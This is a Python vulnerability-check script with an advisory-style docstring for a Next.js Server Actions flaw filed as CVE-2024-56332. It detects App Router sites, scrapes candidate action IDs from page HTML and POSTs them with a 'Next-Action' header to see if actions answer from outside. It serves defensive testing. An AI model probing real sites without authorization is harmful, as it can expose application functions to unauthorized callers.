#!/usr/bin/env python3
"""
CVE-2024-56332 — Next.js Unauthorized Server Actions Invocation
===============================================================

CVE ID      : CVE-2024-56332
GHSA        : GHSA-cj27-4jqw-7347
CVSS Score  : 5.3 (MEDIUM)
CVSS Vector : CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N
Affected    : Next.js >= 14.0.0, < 14.2.21 (App Router with Server Actions)
Patched     : 14.2.21
Published   : 2024-12-16

Description
-----------
Next.js Server Actions (introduced in 14.0.0 as stable) are server-side
functions that can be called directly from client components. They are
identified by an `action-id` string embedded in the JavaScript bundle.

Under certain conditions, a Server Action that is intended to be reachable
only from within the application's own components could be invoked by an
external party by crafting a POST request with the correct `Next-Action`
header and action ID. This is especially impactful when Server Actions
perform operations (data mutation, file access, privileged reads) that
the developer assumed were protected by the calling component's auth context.

Attack Surface
--------------
- Next.js App Router applications using Server Actions
- Server Actions that rely on the calling component for auth context
- Actions that expose sensitive operations (e.g., reading private data,
  triggering admin functions) without their own auth check

Test Methodology
---------------
1. Detect whether the target is App Router (main-app chunk or react-server).
2. Attempt to call a Server Action by POSTing to the target URL with:
   - Content-Type: text/plain;charset=UTF-8
   - Next-Action: <action-id>  (try known patterns)
3. A 200 response with an action result (not a 404 or 400) indicates the
   action is externally callable.

Note: Action IDs are SHA-256 hashes of the action's module path and export
name. Without access to the JS bundles, we can only probe for known patterns
or check if the endpoint responds to the Server Actions protocol at all.

Remediation
-----------
Upgrade Next.js to >= 14.2.21.
Also: always add explicit auth checks inside Server Actions rather than
relying on the calling component's auth context.

References
----------
- https://github.com/advisories/GHSA-cj27-4jqw-7347
- https://nvd.nist.gov/vuln/detail/CVE-2024-56332
"""

from __future__ import annotations

import argparse
import re
import urllib.error
import urllib.request

# Placeholder action IDs — in a real test, extract these from the JS bundles.
# These represent the format (64-char hex string) but are not real action IDs.
PROBE_ACTION_IDS = [
    "0" * 64,  # zero-filled — likely invalid, used to detect error format
    "a" * 64,
]


def fetch(url: str, method: str = "GET", data: bytes | None = None,
          headers: dict[str, str] | None = None, timeout: int = 10) -> tuple[int, str]:
    h = {"User-Agent": "NextJS-CVE-Tester/1.0", "Accept": "text/x-component,*/*"}
    if headers:
        h.update(headers)
    req = urllib.request.Request(url, data=data, headers=h, method=method)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            body = resp.read(4096).decode("utf-8", errors="replace")
            return resp.status, body
    except urllib.error.HTTPError as exc:
        body = exc.read(1024).decode("utf-8", errors="replace") if exc.fp else ""
        return exc.code, body
    except urllib.error.URLError as exc:
        raise ConnectionError(str(exc)) from exc


def is_app_router(body: str) -> bool:
    return bool(re.search(r'/_next/static/chunks/app/', body) or
                re.search(r'"__RSC_MANIFEST"', body) or
                "react-server" in body)


def extract_action_ids_from_html(body: str) -> list[str]:
    """Extract Next.js Server Action IDs from embedded JS (simplified)."""
    return re.findall(r'["\']([0-9a-f]{64})["\']', body)


def run(target: str, timeout: int, verbose: bool) -> int:
    print(f"\n[CVE-2024-56332] Next.js Unauthorized Server Actions")
    print(f"Target : {target}")
    print("-" * 60)

    try:
        status, body = fetch(target, timeout=timeout)
    except ConnectionError as exc:
        print(f"  Connection error: {exc}")
        print("\nVERDICT : INCONCLUSIVE")
        return 2

    if not is_app_router(body):
        print("  App Router chunks not detected — Server Actions only exist in App Router.")
        print("\nVERDICT : NOT APPLICABLE")
        return 0

    print("  App Router detected.")

    # Try to extract real action IDs from the page HTML/JS
    action_ids = extract_action_ids_from_html(body)
    if action_ids:
        print(f"  Found {len(action_ids)} candidate action ID(s) in HTML.")
    all_ids = action_ids[:3] + PROBE_ACTION_IDS

    results = []
    for action_id in all_ids:
        try:
            sa_status, sa_body = fetch(
                target,
                method="POST",
                data=b"[]",
                headers={
                    "Content-Type": "text/plain;charset=UTF-8",
                    "Next-Action": action_id,
                },
                timeout=timeout,
            )
        except ConnectionError:
            continue

        responded = sa_status == 200 and ("0:" in sa_body or "1:" in sa_body)
        if verbose or responded:
            print(f"  Action {action_id[:16]}...  status={sa_status}  responded={responded}")
        if responded:
            results.append((action_id, sa_body[:200]))

    print()
    if results:
        print("VERDICT : LIKELY VULNERABLE")
        print("\nServer Actions endpoint responded to external POST with action results.")
        print("Unauthorized Server Action invocation may be possible.")
        for aid, preview in results:
            print(f"  Action {aid[:16]}...: {preview!r}")
        print("\nFix: Upgrade Next.js to >= 14.2.21")
        return 1
    else:
        print("VERDICT : PATCHED or INCONCLUSIVE")
        print("\nNo Server Actions responded to external probe requests.")
        print("Either patched, no actions defined, or action IDs not guessed correctly.")
        print("For deeper testing: extract action IDs from /_next/static/ JS bundles.")
        return 2


def main() -> int:
    parser = argparse.ArgumentParser(description="Test CVE-2024-56332 Next.js Server Actions exposure")
    parser.add_argument("--target", default="http://localhost:3000")
    parser.add_argument("--timeout", type=int, default=10)
    parser.add_argument("--verbose", "-v", action="store_true")
    args = parser.parse_args()
    return run(args.target, args.timeout, args.verbose)


if __name__ == "__main__":
    raise SystemExit(main())
